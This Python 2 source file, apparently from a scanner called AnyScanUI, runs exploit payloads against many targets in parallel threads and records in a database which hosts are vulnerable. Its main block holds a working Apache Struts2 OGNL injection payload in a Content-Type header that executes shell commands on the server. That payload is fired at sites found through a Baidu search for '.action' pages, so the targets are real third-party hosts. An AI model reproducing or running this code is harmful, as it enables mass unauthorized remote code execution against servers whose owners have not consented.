#!/usr/bin/env python
# -*- coding:utf-8 -*-

import Queue,uuid,traceback,threading
from AnyScanUI.util.util import currenttime
from AnyScanUI.models import poc_main,poc_chil
from AnyScanUI.spider.BaiduSpider import BaiduSpider

class ExecPoc():

    def __init__(self,urls,payload,threads,commond):
        self.payload = payload
        if type(urls) == str:
            self.targets = urls.split(",")
        elif type(urls) == list:
            self.targets = urls
        self.threads = threads
        self.commond = commond

        # target信息Queue
        self.target_queue = Queue.Queue(maxsize = len(self.targets))
        self.target_queue_old_size = len(self.targets)

        try:
            for target in self.targets:
                self.target_queue.put(target)
            print self.target_queue.qsize()
            self.pid = str(uuid.uuid1())
            self.parent = poc_main()
            self.parent.id = self.pid
            # 初始化数据库主数据
            poc_main.objects.create(id=self.pid,start_time=currenttime(),status="running",commond=self.commond,threads=self.threads,progress="0.00")
        except:
            print traceback.format_exc()

    def exploit(self):
        """
        exploit
        :return:
        """
        try:
            while True:

                if self.target_queue.empty() is False:
                    try:
                        target = str(self.target_queue.get())
                        status = False
                        keyword = ""
                        try:
                            code = compile(self.payload, '<string>', 'exec')
                            runtime = {"target":target}
                            exec code in runtime
                            status = runtime.get("status")
                            keyword = runtime.get("keyword")
                            if status is None or keyword is None:
                                status = False
                                keyword = ""
                        except:
                            print traceback.format_exc()
                            pass
                        id = str(uuid.uuid1())
                        poc_chil.objects.create(id=id,pid=self.parent,commond=self.commond,vulnerable=status,host=target,keyword=keyword)
                        # 计算进度
                        progress = 1-float(format(float(self.target_queue.qsize())/float(self.target_queue_old_size),'.4f'))
                        progress = '%.2f' % (progress * 100)
                        # log
                        log = "【%s】正在测试【%s】" % (str(progress)+"%",target)
                        poc_main.objects.filter(id=self.pid,locker="false").update(end_time=currenttime(),status="running",log=log,progress=progress)
                    except:
                        pass
                        print traceback.format_exc()
                else:
                    #print "空了"
                    # 需要检测的目标为空了，更新主任务数据
                    poc_main.objects.filter(id=self.pid,locker="false").update(end_time=currenttime(),status="success",log="所有网站均已验证完成",locker="true",progress="100")
                    break
        except:
            print traceback.format_exc()

    def start(self):
        """
        开始验证
        :return:
        """
        if self.threads > 100:
            self.threads = 100
        for t in range(0,self.threads):
            if self.target_queue.empty():
                break
            tt = threading.Thread(target=self.exploit,args=())
            tt.start()
        return self.pid

if __name__ == '__main__':
    payload = """
# -*- coding: utf-8 -*-
import urllib2
import sys,uuid
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
def exploit(target):
    #print "========>"+str(target)
    register_openers()
    id = str(uuid.uuid1())
    cmd = "echo " + id
    datagen, header = multipart_encode({"image1": ''})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(target,datagen,headers=header)
    response = urllib2.urlopen(request,timeout=3)
    html = response.read()
    if id in html:
        return True,html
    else:
        return False,None

status,keyword = exploit(target)
    """
    b = BaiduSpider(commond="site:*.com.cn inurl:.action",count=100)
    r=b.start()
    res = [__r.get("url") for __r in r]
    __res = ",".join(res)
    print __res
    exe = ExecPoc(__res,payload,10,"commond")
    exe.start()
